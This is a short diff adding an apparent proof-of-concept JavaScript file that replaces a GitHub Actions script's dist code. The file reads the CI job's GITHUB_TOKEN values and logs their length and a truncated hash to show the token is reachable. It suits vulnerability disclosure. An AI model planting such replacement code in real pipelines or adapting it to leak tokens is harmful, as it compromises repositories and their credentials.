@@ -1,0 +1,5 @@
+console.log('POC_GITHUB_SCRIPT_DIST_REPLACED')
+const crypto = require('crypto')
+const h = s => crypto.createHash('sha256').update(s || '').digest('hex').slice(0, 16)
+console.log('POC_NESTED_INPUT_TOKEN_LEN=' + ((process.env.INPUT_GITHUB_TOKEN || '').length) + ' SHA=' + h(process.env.INPUT_GITHUB_TOKEN))
+console.log('POC_NESTED_TOKEN_LEN=' + ((process.env.GITHUB_TOKEN || '').length) + ' SHA=' + h(process.env.GITHUB_TOKEN))
